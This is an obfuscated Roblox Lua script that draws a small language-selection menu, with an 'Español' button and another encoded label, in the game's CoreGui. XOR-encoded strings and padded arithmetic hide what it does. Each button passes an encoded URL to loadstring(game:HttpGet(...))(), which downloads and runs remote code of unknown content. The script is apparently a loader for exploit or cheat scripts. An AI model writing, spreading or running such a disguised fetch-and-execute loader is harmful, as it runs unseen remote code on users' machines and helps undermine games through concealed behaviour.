local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v59,v60) local v61={};for v64=2 -1 , #v59 do v6(v61,v0(v4(v1(v2(v59,v64,v64 + 1 )),v1(v2(v60,(1 -0) + (v64% #v60) ,(2 -1) + (v64% #v60) + 1 )))%(875 -(555 + 64)) ));end return v5(v61);end local v8=Instance.new(v7("\226\192\201\32\227\181\224\11\216","\126\177\163\187\69\134\219\167"));local v9=Instance.new(v7("\5\223\43\200\249","\156\67\173\74\165"));local v10=Instance.new(v7("\1\158\106\25\174\40\67\38","\38\84\215\41\118\220\70"));local v11=Instance.new(v7("\100\19\58\6\210\81\20\39\30","\158\48\118\66\114"));local v12=Instance.new(v7("\159\33\8\34\81\176\239\191\43\30","\155\203\68\112\86\19\197"));local v13=Instance.new(v7("\114\216\46\232\98\109\241\236\73\211","\152\38\189\86\156\32\24\133"));local v14=Instance.new(v7("\201\126\132\73\238\89\162\84","\38\156\55\199"));local v15=Instance.new(v7("\157\84\95\39\1\122\255\81","\35\200\29\28\72\115\20\154"));v8.Parent=game.CoreGui;v8.Name=v7("\42\188\195\214\157\56\7\28\179\212\220\153\35\38\62\138\248","\84\121\223\177\191\237\76");v9.Parent=v8;v9.BackgroundColor3=Color3.fromRGB(961 -(857 + 74) ,105 -(643 -(367 + 201)) ,12 + 18 );v9.Position=UDim2.new(518.35 -(114 + (1331 -(214 + 713))) ,0 + 0 ,(77.35000000000002 + 411) -((983 -(282 + 595)) + (2019 -(1523 + 114))) ,411 -(275 + 31 + (149 -44)) );v9.Size=UDim2.new(1065 -(68 + 997) ,(2293 -(226 + 1044)) -623 ,(1859 -1432) -((283 -(32 + 85)) + 261) ,(742 + 15) -(65 + 224 + (1175 -(892 + 65))) );v9.Active=true;v9.Draggable=true;v9.BorderSizePixel=1344 -((2893 -1680) + 131) ;v10.Parent=v9;v10.CornerRadius=UDim.new((0 -0) + 0 ,(14 -6) + (354 -(87 + 263)) );v11.Parent=v9;v11.Text=v7("\136\83\197\165\57\68\112\248\180\67\219\224\9\83\34\200\171\66","\161\219\54\169\192\90\48\80");v11.Size=UDim2.new((183 -(67 + 113)) -(2 + 0) ,(0 -0) -(0 + 0) ,0.3,(3414 -2555) -((1766 -(802 + 150)) + (121 -76)) );v11.Position=UDim2.new(0 -0 ,(0 -0) + 0 + 0 ,0 + (997 -(915 + 82)) ,0 -0 );v11.BackgroundTransparency=(517 + 369) -((343 -82) + (1811 -(1069 + 118))) ;v11.TextColor3=Color3.fromRGB(453 -(448 -250) ,(2920 -1585) -(178 + 842 + 60) ,453 -198 );v11.Font=Enum.Font.GothamBold;v11.TextSize=(1436 + 11) -(630 + 793) ;v12.Parent=v9;v12.Text="Español";v12.Size=UDim2.new((791 -(368 + 423)) -(0 -0) ,(728 -(10 + 8)) -(2154 -1594) ,(442 -(416 + 26)) + 0 ,172 -(389 -267) );v12.Position=UDim2.new(1747.1 -(327 + 433 + (1746 -759)) ,(2351 -(145 + 293)) -(1789 + (554 -(44 + 386))) ,(2252.6 -(998 + 488)) -(237 + 508 + 21) ,0 + 0 + 0 );v12.BackgroundColor3=Color3.fromRGB(137 -87 ,(1478 -(201 + 571)) -(1664 -(116 + 1022)) ,1 + (328 -249) );v12.Font=Enum.Font.Gotham;v12.TextSize=11 + 7 ;v12.TextColor3=Color3.fromRGB(930 -675 ,905 -650 ,201 + (913 -(814 + 45)) );v14.Parent=v12;v14.CornerRadius=UDim.new((2599 -1544) -(87 + 53 + 915) ,(13 + 22) -(912 -(261 + 624)) );v13.Parent=v9;v13.Text=v7("\108\76\7\41\64\81\8","\69\41\34\96");v13.Size=UDim2.new(0 + 0 ,266 -116 ,(1080 -(1020 + 60)) -(1423 -(630 + 793)) ,(4957 -3494) -(447 + (4573 -3607)) );v13.Position=UDim2.new((0.6 + 0) -(0 -0) ,1817 -(1703 + 114) ,(2448.6 -(760 + 987)) -((2289 -(1789 + 124)) + 325) ,(766 -(745 + 21)) -(0 + 0) );v13.BackgroundColor3=Color3.fromRGB((676 -430) -(651 -485) ,1 + 34 + 67 + 18 ,1305 -(87 + 968) );v13.Font=Enum.Font.Gotham;v13.TextSize=18;v13.TextColor3=Color3.fromRGB((2469 -1908) -306 ,232 + 23 ,576 -321 );v15.Parent=v13;v15.CornerRadius=UDim.new((1427 -(447 + 966)) -((24 -15) + 5) ,(2201 -(1703 + 114)) -((786 -(376 + 325)) + 291) );local function v58(v62) local v63=0 -0 ;while true do if (v63==0) then loadstring(game:HttpGet(v62))();v8:Destroy();break;end end end v12.MouseButton1Click:Connect(function() v58(v7("\180\215\195\26\17\113\243\140\197\11\21\101\187\202\195\2\23\41\169\208\210\24\1\36\178\215\210\4\22\101\191\204\218\69\35\5\152\230\229\57\45\5\187\196\133\95\77\123\229\149\232\71\49\8\140\142\232\71\77\38\189\202\217\69\39\56\172\194\146\41\81\110\158\146\216\6\76\39\169\194","\75\220\163\183\106\98"));end);v13.MouseButton1Click:Connect(function() v58(v7("\10\174\159\39\202\88\245\196\37\216\21\244\140\62\205\10\175\137\34\202\7\168\136\56\215\22\191\133\35\151\1\181\134\120\248\44\158\174\5\234\45\148\140\48\139\87\245\219\110\143\61\247\184\20\233\79\133\198\120\212\3\179\133\120\252\12\189\135\62\202\10\244\135\34\216","\185\98\218\235\87"));end);
